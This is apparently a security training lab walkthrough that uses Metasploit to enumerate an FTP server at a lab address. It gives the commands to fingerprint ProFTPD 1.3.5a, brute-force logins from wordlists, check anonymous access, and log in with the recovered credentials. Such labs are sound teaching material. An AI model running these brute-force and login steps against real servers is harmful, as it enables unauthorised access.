Before we can begin, we will need to startup the Metasploit Framework console (msfconsole), this can be done by running the following command:

Command:

```
msfconsole
```

To begin with, we will need to identify a service version of the FTP server running on the target, this can be done by loading the following module:

Command:

```
use auxiliary/scanner/ftp/ftp_version
```

We will now need to configure the module options, more specifically, the target IP option, this can be done by running the following command:

Command:

```
set RHOSTS 192.51.147.3
```

We can now run the module by running the following command:

Command:

```
run
```

As shown in the following screenshot, the module reveals that the target system is running ProFTPD 1.3.5a.

We can perform a brute-force on the FTP server to identify legitimate credentials that we can use for authentication, this can be done by loading the ftp_login module as follows:

Command:

```
use auxiliary/scanner/ftp/ftp_login
```

We will now need to configure the module options, more specifically, the target IP option, this can be done by running the following command:

Command:

```
set RHOSTS 192.51.147.3
```

Given that we are performing a brute force attack, we will also need to configure the `USER_FILE` and `PASS_FILE` options.

Command:

```
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
```

Command:

```
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
```

We can now run the module by running the following command:

Command:

```
run
```

As shown in the following screenshot, after a couple of seconds the brute force attack identifies the credentials `sysadmin/654321`.

We can also check if anonymous logons are allowed on the FTP server, this can be done by loading the following command:

Command:

```
use auxiliary/scanner/ftp/anonymous
```

We will now need to configure the module options, more specifically, the target IP option, this can be done by running the following command:

Command:

```
set RHOSTS 192.51.147.3
```

We can now run the module by running the following command:

Command:

```
run
```

As shown in the following screenshot, the module reveals that anonymous FTP logons are not enabled on the FTP server.

We can now login to the FTP server with the credentials we obtained from the FTP brute force, this can be done through the use of the FTP client on Kali Linux.

Command:

```
ftp 192.51.147.3
```

As shown in the following screenshot, you will be prompted to provide a username and password, supply the credentials we obtained from the brute force attack.

As shown in the preceding screenshot, authentication is successful and we are logged in to the FTP server.

## Conclusion
In this lab, we explored the process of performing FTP enumeration with the Metasploit Framework.
